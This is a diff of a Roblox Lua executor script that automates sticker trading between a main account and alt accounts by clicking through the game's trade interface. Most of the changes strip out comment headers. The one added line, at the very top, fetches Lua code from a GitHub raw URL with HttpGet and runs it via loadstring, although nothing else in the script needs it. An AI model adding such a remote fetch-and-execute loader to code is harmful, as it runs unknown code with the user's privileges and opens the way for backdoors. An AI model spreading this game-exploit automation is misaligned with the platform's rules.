@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/junggamyeon/Chatgpt-source/refs/heads/main/check.lua"))()
 local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local GuiService = game:GetService("GuiService")
@@ -8,10 +9,6 @@ local Config = getgenv().Config or {}
 local MainAcc = tostring(Config["Main Account"] or "")
 
 local StickerTypes = require(RS.Stickers.StickerTypes)
-
--------------------------------------------------
--- UTILS
--------------------------------------------------
 local function waitForPath(root, path)
     local cur = root
     for _, name in ipairs(path) do
@@ -74,10 +71,6 @@ local function smartClick(btn)
 
     return false
 end
-
--------------------------------------------------
--- ACCEPT CHECK
--------------------------------------------------
 local function shouldAccept(btn)
     local ok, label = pcall(function()
         return btn:FindFirstChild("TextLabel", true)
@@ -87,10 +80,6 @@ local function shouldAccept(btn)
     end
     return true
 end
-
--------------------------------------------------
--- MAIN DETECT
--------------------------------------------------
 local function isMainAccount()
     if tostring(LP.UserId) == MainAcc then return true end
     if LP.Name == MainAcc then return true end
@@ -106,9 +95,6 @@ local function findMainPlayer()
     end
 end
 
--------------------------------------------------
--- STICKER IMAGE MAP
--------------------------------------------------
 local NameToImage = {}
 
 local function scan(t)
@@ -135,9 +121,6 @@ for _, name in ipairs(Config["Sticker Trade"] or {}) do
     end
 end
 
--------------------------------------------------
--- GUI PATHS
--------------------------------------------------
 local function getTradeLayer()
     return LP.PlayerGui:WaitForChild("ScreenGui"):WaitForChild("TradeLayer")
 end
@@ -152,10 +135,6 @@ local function getAcceptButton(anchor)
     end)
     if ok then return btn end
 end
-
--------------------------------------------------
--- MAIN LOGIC
--------------------------------------------------
 local function mainLoop()
     print("MODE: MAIN")
 
@@ -188,10 +167,6 @@ local function mainLoop()
         task.wait(0.5)
     end
 end
-
--------------------------------------------------
--- ALT LOGIC
--------------------------------------------------
 local function altLoop()
     print("MODE: ALT")
 
@@ -258,10 +233,6 @@ local function altLoop()
         writefile(LP.Name .. ".txt", "Completed-TradeStarSign")
     end)
 end
-
--------------------------------------------------
--- START
--------------------------------------------------
 task.spawn(function()
     if isMainAccount() then
         mainLoop()
